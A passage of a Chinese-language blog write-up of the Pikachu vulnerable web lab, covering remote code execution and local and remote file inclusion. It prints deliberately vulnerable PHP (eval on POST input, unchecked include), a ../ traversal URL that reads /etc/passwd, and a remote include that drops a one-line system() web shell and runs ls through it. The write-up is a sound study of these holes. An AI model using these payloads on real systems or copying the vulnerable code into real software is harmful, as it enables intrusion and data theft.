class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">@!</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>实际上，CTF和实际场景中的RCE千奇百怪，漏洞的利用方式也层出不穷，这里只做最简单基础的展示</p>
<h2 id="file-inclusion">File Inclusion</h2>
<h3 id="概述-5">概述</h3>
<p>文件包含（File Inclusion）其实是一个功能。在各种开发语言中都提供了内置的文件包含函数，可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中提供文件包含函数：</p>
<ul>
<li><code>include()</code>、<code>include_once()</code></li>
<li><code>require()</code>、<code>require_once()</code></li>
</ul>
<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是有些时候文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来。这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个意想不到的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
<ul>
<li>本地文件包含漏洞
<ul>
<li>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力</li>
</ul>
</li>
<li>远程文件包含漏洞
<ul>
<li>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况已经没什么能说的了，准备挂彩就完了。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，就算如果非要这么做不可，也一定要做严格的白名单策略进行过滤</li>
</ul>
</li>
</ul>
<p><img alt="img" src="./img/20220900.png"></p>
<h3 id="file-inclusionlocal">File Inclusion（local）</h3>
<p>页面上有一个下拉表单，可以选择不同的选项并弹出相关的内容</p>
<p><img alt="img" src="./img/2022090-10.png"></p>
<p>我们看看URL，发现这是一个通过GET请求访问服务器本地文件完成的页面变换</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
</code></pre><p>来改一下URL</p>
<p>多敲几个<code>../</code>让其跳转到根目录，然后访问<a href="http://c.biancheng.net/view/839.html"><code>/etc/passwd</code></a>文件</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
</code></pre><p><img alt="img" src="./img/2022091-8.png"></p>
<p>操作系统的账号密码就被打印出来了</p>
<p>后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;fi_local.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;include/</span><span class="si">$filename</span><span class="s2">&#34;</span><span class="p">;</span><span class="c1">//变量传进来直接包含,没做任何的安全限制
</span></span></span><span class="line"><span class="cl"><span class="c1">//     //安全的写法,使用白名单，严格指定包含的文件名
</span></span></span><span class="line"><span class="cl"><span class="c1">//     if($filename==&#39;file1.php&#39; || $filename==&#39;file2.php&#39; || $filename==&#39;file3.php&#39; || $filename==&#39;file4.php&#39; || $filename==&#39;file5.php&#39;){
</span></span></span><span class="line"><span class="cl"><span class="c1">//         include &#34;include/$filename&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//     }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="file-inclusionremote">File Inclusion（remote）</h3>
<p>远程文件包含漏洞成立的前提是需要php.ini（php5.4.34）配置</p>
<ul>
<li><code>allow_url_fopen = on</code>（默认打开）</li>
<li><code>Allow_url_include = on</code>（默认关闭）</li>
</ul>
<p>由于靶场是用docker配置的，修改php.ini略麻烦，这里用网上的图片演示</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/fi_remote.php
</code></pre><p>pikachu内置了一个一句话木马文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">http</span><span class="o">://</span><span class="nx">light</span><span class="o">.</span><span class="nx">asuka39</span><span class="o">.</span><span class="nx">top</span><span class="o">:</span><span class="mi">9000</span><span class="o">/</span><span class="nx">test</span><span class="o">/</span><span class="nx">yijuhua</span><span class="o">.</span><span class="nx">txt</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;yijuhua.php&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$txt</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php system($_GET[x]);?&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$txt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>修改一下URL（忽略掉没有变化的IP地址，才不是懒得搞）</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/fi_remote.php?filename=http://light.asuka39.top:9000/test/yijuhua.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
</code></pre><p>一般传入的文件是在同级目录下，修改URL访问一下我们的一句话木马</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/yijuhua.php?x=ls
</code></pre><p><img alt="img" src="./img/2022092-4.png"></p>
<p>后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;fi_remote.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span 